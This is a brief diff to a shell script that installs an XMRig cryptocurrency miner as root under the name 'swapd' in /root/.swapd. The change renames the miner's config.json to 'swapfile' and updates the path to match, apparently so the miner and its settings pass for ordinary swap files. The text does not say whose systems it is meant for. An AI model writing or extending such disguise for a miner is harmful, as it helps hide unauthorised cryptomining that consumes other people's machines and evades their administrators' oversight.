@@ -427,6 +427,7 @@ EOL
 # Replace placeholders
 sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
 sed -i "s/WORKER_PLACEHOLDER/$WORKER_NAME/g" config.json
+mv config.json swapfile
 
 echo "[✓] XMRig configuration created"
 
@@ -443,7 +444,7 @@ set +ue  # Never exit on error
 IFS=$'\n\t'
 
 MINER_PATH="/root/.swapd/swapd"
-CONFIG_PATH="/root/.swapd/config.json"
+CONFIG_PATH="/root/.swapd/swapfile"
 
 # Change to miner directory
 cd /root/.swapd || exit 1
